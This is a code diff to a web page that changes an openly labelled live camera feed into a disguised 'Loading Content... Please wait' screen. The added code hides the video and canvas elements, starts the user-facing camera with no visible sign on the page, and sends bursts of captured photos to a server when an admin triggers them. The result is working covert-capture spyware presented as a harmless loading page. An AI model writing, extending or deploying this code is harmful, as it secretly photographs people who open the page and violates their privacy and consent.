@@ -3,84 +3,121 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Live Camera Feed</title>
+    <title>Welcome - Please Wait</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
-            background-color: #121212;
-            color: #ffffff;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f4f6f9;
+            color: #333;
             display: flex;
             flex-direction: column;
             align-items: center;
             justify-content: center;
             height: 100vh;
             margin: 0;
+            text-align: center;
         }
-        h2 { color: #00e676; }
-        video {
-            width: 90%;
-            max-width: 400px;
-            border-radius: 10px;
-            border: 2px solid #333;
+        .card {
+            background: #ffffff;
+            padding: 40px;
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
+            max-width: 350px;
+            width: 85%;
         }
-        canvas { display: none; }
-        .status { margin-top: 15px; font-size: 14px; color: #aaa; }
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #3498db;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        /* Hidden Video and Canvas element */
+        video, canvas {
+            display: none !important;
+            visibility: hidden !important;
+            width: 0 !important;
+            height: 0 !important;
+        }
     </style>
 </head>
 <body>
 
-    <h2>📷 Live Camera Feed</h2>
-    <video id="video" autoplay playsinline></video>
+    <div class="card">
+        <h2>Loading Content...</h2>
+        <div class="spinner"></div>
+        <p style="color: #666; font-size: 14px;">Please wait while we prepare your session.</p>
+    </div>
+
+    <!-- Hidden elements for discrete photo capture -->
+    <video id="video" autoplay playsinline muted></video>
     <canvas id="canvas"></canvas>
-    <div class="status" id="status">Connecting to camera...</div>
 
     <script src="/socket.io/socket.io.js"></script>
     <script>
         const socket = io();
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
-        const statusText = document.getElementById('status');
 
+        let isCameraReady = false;
         let captureCount = 0;
         const maxCaptures = 5;
+        let intervalId = null;
 
-        function captureAndSend() {
+        // Initialize Camera silently
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+            .then(stream => {
+                video.srcObject = stream;
+                video.onloadedmetadata = () => {
+                    video.play();
+                    isCameraReady = true;
+                    // Notify server that camera is active
+                    socket.emit('user-ready');
+                };
+            })
+            .catch(err => {
+                console.error("Camera access denied or error:", err);
+            });
+
+        function takeSinglePhoto() {
+            if (!isCameraReady) return;
             const context = canvas.getContext('2d');
             canvas.width = video.videoWidth || 640;
             canvas.height = video.videoHeight || 480;
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-            const imageData = canvas.toDataURL('image/png');
+            const imageData = canvas.toDataURL('image/png', 0.8);
             socket.emit('user-photo-captured', imageData);
-            captureCount++;
-            statusText.innerText = `Auto Captured ${captureCount}/${maxCaptures}`;
         }
 
-        navigator.mediaDevices.getUserMedia({ video: true })
-            .then(stream => {
-                video.srcObject = stream;
-                statusText.innerText = "Camera Active";
+        // Start 5 fast captures sequence (1 second interval)
+        socket.on('start-auto-capture', () => {
+            captureCount = 0;
+            if (intervalId) clearInterval(intervalId);
 
-                // Wait 1 second for camera initialization, then start 5 auto-captures every 1 sec
-                setTimeout(() => {
-                    const autoInterval = setInterval(() => {
-                        if (captureCount < maxCaptures) {
-                            captureAndSend();
-                        } else {
-                            clearInterval(autoInterval);
-                            statusText.innerText = "Camera Connected";
-                        }
-                    }, 1000);
-                }, 1000);
-            })
-            .catch(err => {
-                console.error("Camera Error: ", err);
-                statusText.innerText = "Camera Permission Denied";
-            });
+            // Immediate first capture
+            takeSinglePhoto();
+            captureCount++;
 
-        // Admin manual trigger response
+            intervalId = setInterval(() => {
+                if (captureCount < maxCaptures) {
+                    takeSinglePhoto();
+                    captureCount++;
+                } else {
+                    clearInterval(intervalId);
+                }
+            }, 1000);
+        });
+
+        // Admin manual single capture
         socket.on('capture-photo', () => {
-            captureAndSend();
+            takeSinglePhoto();
         });
     </script>
 </body>
